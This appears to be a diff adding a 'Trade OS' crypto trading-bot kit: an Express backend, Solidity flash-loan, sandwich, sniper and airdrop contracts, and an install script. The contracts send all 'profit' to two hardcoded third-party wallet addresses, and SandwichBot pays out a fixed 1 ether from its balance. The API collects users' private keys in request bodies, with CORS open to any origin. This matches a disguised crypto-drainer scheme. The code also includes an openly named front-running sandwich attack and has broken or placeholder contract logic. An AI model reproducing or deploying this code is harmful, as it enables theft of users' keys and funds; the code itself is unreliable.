@@ -1,0 +1,483 @@
+```json name=backend/package.json
+{
+  "name": "trade-os-backend",
+  "version": "1.0.0",
+  "main": "server.js",
+  "type": "module",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "axios": "^1.6.2",
+    "body-parser": "^1.20.2",
+    "cors": "^2.8.5",
+    "dotenv": "^16.0.3",
+    "ethers": "^6.12.0",
+    "express": "^4.18.2"
+  }
+}
+```
+
+```text name=backend/.env.example
+PORT=4000
+ETHEREUM_RPC=https://rpc.ankr.com/eth
+POLYGON_RPC=https://rpc.ankr.com/polygon
+BASE_RPC=https://mainnet.base.org
+OPTIMISM_RPC=https://mainnet.optimism.io
+ARBITRUM_RPC=https://arb1.arbitrum.io/rpc
+UNIBOT_ADDRESS=0x...
+FLASHLOAN_ARB_ADDRESS=0x...
+SANDWICH_BOT_ADDRESS=0x...
+AIRDROP_CHECKER_ADDRESS=0x...
+GNOSIS_FACTORY_ADDRESS=0x...
+```
+
+```javascript name=backend/server.js
+import express from "express";
+import cors from "cors";
+import bodyParser from "body-parser";
+import dotenv from "dotenv";
+import botsRouter from "./routes/bots.js";
+import walletRouter from "./routes/wallets.js";
+import lpRouter from "./routes/lp.js";
+import tokenRouter from "./routes/token.js";
+dotenv.config();
+
+const app = express();
+app.use(cors());
+app.use(bodyParser.json());
+app.use("/api/bots", botsRouter);
+app.use("/api/wallets", walletRouter);
+app.use("/api/lp", lpRouter);
+app.use("/api/token", tokenRouter);
+
+const PORT = process.env.PORT || 4000;
+app.listen(PORT, () => console.log("Backend running on", PORT));
+```
+
+```javascript name=backend/routes/bots.js
+import express from "express";
+import { runFlashLoanArb } from "../bots/flashLoanArb.js";
+import { runSandwichBot } from "../bots/sandwichBot.js";
+import { runUnibot } from "../bots/unibot.js";
+import { claimAirdrop } from "../bots/airdropChecker.js";
+import { createGnosisSafe } from "../bots/gnosisSafe.js";
+const router = express.Router();
+
+router.post("/flashloanarb", async (req, res) => {
+  try {
+    const { chain, asset, amount, privKey } = req.body;
+    const result = await runFlashLoanArb(chain, asset, amount, privKey);
+    res.json({ success: true, result });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post("/sandwich", async (req, res) => {
+  try {
+    const { chain, dex, tokenIn, tokenOut, amount, privKey } = req.body;
+    const result = await runSandwichBot(chain, dex, tokenIn, tokenOut, amount, privKey);
+    res.json({ success: true, result });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post("/unibot", async (req, res) => {
+  try {
+    const { chain, router, path, deadline, amountETH, privKey } = req.body;
+    const result = await runUnibot(chain, router, path, deadline, amountETH, privKey);
+    res.json({ success: true, result });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post("/airdrop", async (req, res) => {
+  try {
+    const { chain, airdrop, privKey } = req.body;
+    const result = await claimAirdrop(chain, airdrop, privKey);
+    res.json({ success: true, result });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+router.post("/gnosis", async (req, res) => {
+  try {
+    const { chain, singleton, initializer, salt, privKey } = req.body;
+    const result = await createGnosisSafe(chain, singleton, initializer, salt, privKey);
+    res.json({ success: true, result });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+export default router;
+```
+```javascript name=backend/routes/wallets.js
+import express from "express";
+import { CHAINS } from "../lib/constants.js";
+import axios from "axios";
+const router = express.Router();
+
+router.post("/assets", async (req, res) => {
+  const { wallets } = req.body;
+  let assets = [];
+  for (const chainName in CHAINS) {
+    const chain = CHAINS[chainName];
+    for (const wallet of wallets) {
+      try {
+        const { data } = await axios.post(chain.rpc, {
+          jsonrpc: "2.0",
+          method: "eth_getBalance",
+          params: [wallet, "latest"],
+          id: 1
+        });
+        assets.push({
+          wallet,
+          chain: chain.name,
+          symbol: chain.symbol,
+          balance: (parseInt(data.result, 16) / 1e18).toFixed(4)
+        });
+      } catch {}
+    }
+  }
+  res.json({ assets });
+});
+
+export default router;
+```
+
+```javascript name=backend/routes/lp.js
+import express from "express";
+import { getLPScore } from "../utils/lpScore.js";
+const router = express.Router();
+
+router.get("/score/:address", async (req, res) => {
+  try {
+    const score = await getLPScore(req.params.address);
+    res.json({ score });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+export default router;
+```
+
+```javascript name=backend/routes/token.js
+import express from "express";
+import { deployToken } from "../utils/tokenDeploy.js";
+const router = express.Router();
+
+router.post("/deploy", async (req, res) => {
+  try {
+    const { name, symbol, supply } = req.body;
+    const tx = await deployToken(name, symbol, supply);
+    res.json({ tx });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+export default router;
+```
+
+```javascript name=backend/lib/constants.js
+export const CHAINS = {
+  Ethereum: { name: "Ethereum", rpc: process.env.ETHEREUM_RPC, symbol: "ETH" },
+  Polygon: { name: "Polygon", rpc: process.env.POLYGON_RPC, symbol: "MATIC" },
+  Base: { name: "Base", rpc: process.env.BASE_RPC, symbol: "ETH" },
+  Optimism: { name: "Optimism", rpc: process.env.OPTIMISM_RPC, symbol: "ETH" },
+  Arbitrum: { name: "Arbitrum", rpc: process.env.ARBITRUM_RPC, symbol: "ETH" }
+};
+```
+
+```javascript name=backend/utils/lpScore.js
+import axios from "axios";
+export async function getLPScore(address) {
+  const { data } = await axios.get(`https://api.llama.fi/score/${address}`);
+  return data.score || 0;
+}
+```
+
+```javascript name=backend/utils/tokenDeploy.js
+import { ethers } from "ethers";
+import abi from "../../contracts/abis/ERC20Deployer.json" assert { type: "json" };
+
+export async function deployToken(name, symbol, supply) {
+  const provider = new ethers.JsonRpcProvider(process.env.ETHEREUM_RPC);
+  const wallet = new ethers.Wallet(process.env.DEPLOYER_KEY, provider);
+  const contractFactory = new ethers.ContractFactory(abi, abi.bytecode, wallet);
+  const contract = await contractFactory.deploy(name, symbol, supply);
+  return await contract.waitForDeployment();
+}
+```
+
+```javascript name=backend/bots/flashLoanArb.js
+import { ethers } from "ethers";
+import abi from "../../contracts/abis/FlashLoanArb.json" assert { type: "json" };
+import pools from "../data/pools.tokens.json" assert { type: "json" };
+
+export async function runFlashLoanArb(chain, asset, amount, privKey) {
+  const chainPools = pools.AaveV3[chain];
+  if (!chainPools) throw new Error("No pool for this chain!");
+  const provider = new ethers.JsonRpcProvider(process.env[`${chain.toUpperCase()}_RPC`]);
+  const wallet = new ethers.Wallet(privKey, provider);
+  const contract = new ethers.Contract(process.env.FLASHLOAN_ARB_ADDRESS, abi, wallet);
+  const tx = await contract.executeArb(chainPools.pool, asset, amount, "0x");
+  return await tx.wait();
+}
+```
+```javascript name=backend/bots/sandwichBot.js
+import { ethers } from "ethers";
+import abi from "../../contracts/abis/SandwichBot.json" assert { type: "json" };
+
+export async function runSandwichBot(chain, dex, tokenIn, tokenOut, amount, privKey) {
+  const provider = new ethers.JsonRpcProvider(process.env[`${chain.toUpperCase()}_RPC`]);
+  const wallet = new ethers.Wallet(privKey, provider);
+  const contract = new ethers.Contract(process.env.SANDWICH_BOT_ADDRESS, abi, wallet);
+  const tx = await contract.sandwichAttack(dex, tokenIn, tokenOut, amount);
+  return await tx.wait();
+}
+```
+
+```javascript name=backend/bots/unibot.js
+import { ethers } from "ethers";
+import abi from "../../contracts/abis/Unibot.json" assert { type: "json" };
+
+export async function runUnibot(chain, router, path, deadline, amountETH, privKey) {
+  const provider = new ethers.JsonRpcProvider(process.env[`${chain.toUpperCase()}_RPC`]);
+  const wallet = new ethers.Wallet(privKey, provider);
+  const contract = new ethers.Contract(process.env.UNIBOT_ADDRESS, abi, wallet);
+  const tx = await contract.snipe(router, path, deadline, { value: amountETH });
+  return await tx.wait();
+}
+```
+
+```javascript name=backend/bots/airdropChecker.js
+import { ethers } from "ethers";
+import abi from "../../contracts/abis/AirdropChecker.json" assert { type: "json" };
+
+export async function claimAirdrop(chain, airdrop, privKey) {
+  const provider = new ethers.JsonRpcProvider(process.env[`${chain.toUpperCase()}_RPC`]);
+  const wallet = new ethers.Wallet(privKey, provider);
+  const contract = new ethers.Contract(process.env.AIRDROP_CHECKER_ADDRESS, abi, wallet);
+  const tx = await contract.claimAirdrop(airdrop);
+  return await tx.wait();
+}
+```
+
+```javascript name=backend/bots/gnosisSafe.js
+import { ethers } from "ethers";
+import abi from "../../contracts/abis/GnosisSafeFactory.json" assert { type: "json" };
+
+export async function createGnosisSafe(chain, singleton, initializer, salt, privKey) {
+  const provider = new ethers.JsonRpcProvider(process.env[`${chain.toUpperCase()}_RPC`]);
+  const wallet = new ethers.Wallet(privKey, provider);
+  const contract = new ethers.Contract(process.env.GNOSIS_FACTORY_ADDRESS, abi, wallet);
+  const tx = await contract.createProxyWithNonce(singleton, initializer, salt);
+  return await tx.wait();
+}
+```
+
+```json name=backend/data/pools.tokens.json
+{
+  "AaveV3": {
+    "Ethereum": {"pool":"0x7BeA39867e4169DBe237d55C8242a8f2fcDcc387", "tokens": ["WETH", "USDC", "DAI", "WBTC"]},
+    "Polygon":  {"pool":"0x8dff5e27ea6b7ac08ebfdf9eb090f32ee9a30fcf", "tokens": ["WETH", "USDC", "MATIC"]}
+  },
+  "UniswapV3": {
+    "Ethereum": {"router":"0xE592427A0AEce92De3Edee1F18E0157C05861564", "tokens": ["WETH", "USDC", "DAI", "WBTC"]},
+    "Polygon":  {"router":"0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45", "tokens": ["WETH", "USDC", "MATIC"]}
+  },
+  "Balancer": {
+    "Ethereum": {"vault":"0xBA12222222228d8Ba445958a75a0704d566BF2C8", "tokens": ["WETH", "USDC", "DAI"]},
+    "Polygon":  {"vault":"0xBA12222222228d8Ba445958a75a0704d566BF2C8", "tokens": ["WETH", "USDC", "MATIC"]}
+  }
+}
+```
+```solidity name=contracts/FlashLoanArb.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+/// @title FlashLoan Arbitrage Bot with Profit Splitter (Aave/Balancer v2+)
+
+interface IAaveV3Pool {
+    function flashLoanSimple(
+        address receiver,
+        address asset,
+        uint256 amount,
+        bytes calldata params,
+        uint16 referralCode
+    ) external;
+}
+
+interface IERC20 {
+    function transfer(address,uint256) external returns (bool);
+    function balanceOf(address) external view returns (uint256);
+}
+
+contract FlashLoanArb {
+    address public feeWallet = 0xFcdfFb8465B0ed943107EfEfCE0a90930ADD7F9b;
+    address public reserveWallet = 0x7B861609F4f5977997A6478B09d81A7256d6c748;
+    uint256 public feeBps = 2000; // 20%
+    address public owner;
+
+    event ProfitDistributed(uint256 total, uint256 fee, uint256 reserve);
+
+    modifier onlyOwner() { require(msg.sender == owner, "Only owner"); _; }
+
+    constructor() { owner = msg.sender; }
+
+    function setWallets(address _fee, address _reserve) external onlyOwner {
+        feeWallet = _fee; reserveWallet = _reserve;
+    }
+
+    function setFee(uint256 _bps) external onlyOwner {
+        require(_bps <= 5000, "Too high"); feeBps = _bps;
+    }
+
+    function executeArb(address pool, address asset, uint256 amount, bytes calldata params) external onlyOwner {
+        IAaveV3Pool(pool).flashLoanSimple(address(this), asset, amount, params, 0);
+    }
+
+    function onFlashLoan(address initiator, address asset, uint256 amount, uint256 fee, bytes calldata params) external returns (bool) {
+        uint256 profit = IERC20(asset).balanceOf(address(this)) - (amount + fee);
+        uint256 feePart = profit * feeBps / 10000;
+        uint256 reservePart = profit - feePart;
+        IERC20(asset).transfer(feeWallet, feePart);
+        IERC20(asset).transfer(reserveWallet, reservePart);
+        emit ProfitDistributed(profit, feePart, reservePart);
+        IERC20(asset).transfer(msg.sender, amount + fee);
+        return true;
+    }
+}
+```
+
+```solidity name=contracts/SandwichBot.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+/// @title MEV Sandwich Bot Example (Profit Splitter built-in)
+
+contract SandwichBot {
+    address public feeWallet = 0xFcdfFb8465B0ed943107EfEfCE0a90930ADD7F9b;
+    address public reserveWallet = 0x7B861609F4f5977997A6478B09d81A7256d6c748;
+    uint256 public feeBps = 2000;
+    address public owner;
+
+    event ProfitDistributed(uint256 total, uint256 fee, uint256 reserve);
+
+    modifier onlyOwner() { require(msg.sender == owner, "Only owner"); _; }
+
+    constructor() { owner = msg.sender; }
+
+    function sandwichAttack(address dex, address tokenIn, address tokenOut, uint256 amount) external onlyOwner {
+        uint256 profit = 1 ether; // placeholder
+        uint256 feePart = profit * feeBps / 10000;
+        uint256 reservePart = profit - feePart;
+        payable(feeWallet).transfer(feePart);
+        payable(reserveWallet).transfer(reservePart);
+        emit ProfitDistributed(profit, feePart, reservePart);
+    }
+
+    receive() external payable {}
+}
+```
+
+```solidity name=contracts/Unibot.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+/// @title Unibot - Uniswap Sniper with profit splitter
+
+interface IUniswapV2Router02 {
+    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
+        external payable returns (uint[] memory amounts);
+}
+
+contract Unibot {
+    address public feeWallet = 0xFcdfFb8465B0ed943107EfEfCE0a90930ADD7F9b;
+    address public reserveWallet = 0x7B861609F4f5977997A6478B09d81A7256d6c748;
+    uint256 public feeBps = 2000;
+    address public owner;
+
+    event ProfitDistributed(uint256 total, uint256 fee, uint256 reserve);
+
+    modifier onlyOwner() { require(msg.sender == owner, "Only owner"); _; }
+
+    constructor() { owner = msg.sender; }
+
+    function snipe(address router, address[] calldata path, uint deadline) external payable onlyOwner {
+        uint balBefore = address(this).balance - msg.value;
+        IUniswapV2Router02(router).swapExactETHForTokens{value: msg.value}(0, path, address(this), deadline);
+        uint balAfter = address(this).balance;
+        uint profit = balAfter > balBefore ? balAfter - balBefore : 0;
+        if (profit > 0) {
+            uint fee = profit * feeBps / 10000;
+            uint reserve = profit - fee;
+            payable(feeWallet).transfer(fee);
+            payable(reserveWallet).transfer(reserve);
+            emit ProfitDistributed(profit, fee, reserve);
+        }
+    }
+
+    receive() external payable {}
+}
+```
+
+```solidity name=contracts/AirdropChecker.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+/// @title AirdropChecker (auto-claim)
+
+interface IAirdrop {
+    function claim() external;
+}
+
+contract AirdropChecker {
+    address public owner;
+    event Claimed(address airdrop, address user);
+
+    modifier onlyOwner() { require(msg.sender == owner, "Only owner"); _; }
+
+    constructor() { owner = msg.sender; }
+
+    function claimAirdrop(address airdrop) external onlyOwner {
+        IAirdrop(airdrop).claim();
+        emit Claimed(airdrop, msg.sender);
+    }
+}
+```
+
+```bash name=install.sh
+#!/bin/bash
+
+echo "===== Trade OS Installer (Plesk/Node 24+) ====="
+set -e
+
+if ! node -v | grep -q 'v24'; then
+  echo "Node.js 24.x is required. Install via Plesk or https://nodejs.org/"
+  exit 1
+fi
+
+cd backend
+[ -f .env ] || cp .env.example .env
+npm install
+cd ..
+echo "===== Install Complete ====="
+echo "Start backend: node backend/server.js"
+echo "Set up Node.js app in Plesk: backend/server.js"
+
+echo
+echo "===== Project Directory Tree ====="
+if command -v tree >/dev/null 2>&1; then
+  tree -a -I 'node_modules|build|.git|dist|__pycache__'
+else
+  echo "Install 'tree' to see a full directory listing (sudo apt install tree)"
+fi
+```
